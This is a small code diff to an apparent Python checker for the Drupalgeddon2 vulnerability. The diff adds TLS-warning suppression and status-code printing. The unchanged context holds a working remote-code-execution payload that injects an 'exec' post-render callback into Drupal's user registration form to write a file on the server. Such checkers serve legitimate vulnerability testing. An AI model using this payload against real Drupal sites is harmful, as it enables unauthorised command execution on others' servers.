@@ -1,6 +1,9 @@
 import re
 import sys
 import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def test_drupalgeddon2(target):
     # Arguments:
@@ -13,7 +16,9 @@ def test_drupalgeddon2(target):
     payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo hello world | tee hello.txt'}
      
     r = requests.post(url, data=payload, verify=verify)
+    print(r.status_code)
     check = requests.get(target + 'hello.txt')
+    print(check.status_code)
     if check.status_code != 200:
         return 0
     else:
